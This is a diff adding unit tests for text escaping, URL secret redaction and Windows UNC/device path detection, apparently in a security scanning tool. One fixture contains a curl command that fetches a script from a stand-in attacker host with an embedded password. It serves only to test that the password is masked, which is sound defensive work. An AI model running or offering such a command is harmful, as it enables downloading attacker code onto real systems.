@@ -3,6 +3,8 @@ import { asList, parseFrontmatter } from '../src/util/frontmatter.js';
 import { matchesGlob } from '../src/util/glob.js';
 import { canonicalJson } from '../src/util/hash.js';
 import { parseJsonc } from '../src/util/jsonc.js';
+import { redactSecrets } from '../src/patterns/secrets.js';
+import { isRemoteOrDevicePath } from '../src/util/paths.js';
 import { lineAt, lineColAt, printable } from '../src/util/text.js';
 
 describe('frontmatter', () => {
@@ -43,6 +45,31 @@ describe('text', () => {
     expect(lineColAt('ab\ncd', 4)).toEqual({ line: 2, column: 2 });
     expect(lineAt('a\r\nb\r\nc', 2)).toBe('b');
     expect(printable('a​b\u{e0041}')).toBe('a\\u200bb\\u{e0041}');
+  });
+
+  it('escapes line separators and C1 controls', () => {
+    const raw = ['a', 'b', 'c', 'd'].join(String.fromCharCode(0x2028)).replace('c', `${String.fromCharCode(0x2029)}c${String.fromCharCode(0x85)}`);
+    const shown = printable(raw);
+    expect([...shown].every((ch) => ch.charCodeAt(0) >= 0x20 && ch.charCodeAt(0) < 0x7f)).toBe(true);
+    expect(shown).toContain('u2028');
+    expect(shown).toContain('u2029');
+    expect(shown).toContain('u0085');
+  });
+
+  it('masks passwords in URLs and keeps the rest', () => {
+    expect(redactSecrets('curl https://admin:Hunter2pw@evil.example/x.sh')).toBe('curl https://admin:****@evil.example/x.sh');
+    const plain = 'git clone ssh://git@github.com/a/b and https://example.com/a:b@c';
+    expect(redactSecrets(plain)).toBe(plain);
+  });
+
+  it('recognises UNC and device paths only on Windows', () => {
+    const bs = '\\';
+    const remote = [`${bs}${bs}host${bs}share`, '//host/share', `${bs}${bs}?${bs}UNC${bs}host${bs}x`, `${bs}${bs}.${bs}pipe${bs}x`, `${bs}/host/share`];
+    for (const p of remote) {
+      expect(isRemoteOrDevicePath(p, 'win32'), p).toBe(true);
+      expect(isRemoteOrDevicePath(p, 'linux'), p).toBe(false);
+    }
+    for (const p of [`C:${bs}Users${bs}x`, 'C:/x', `${bs}x`, `relative${bs}x`]) expect(isRemoteOrDevicePath(p, 'win32'), p).toBe(false);
   });
 
   it('serializes canonically', () => {
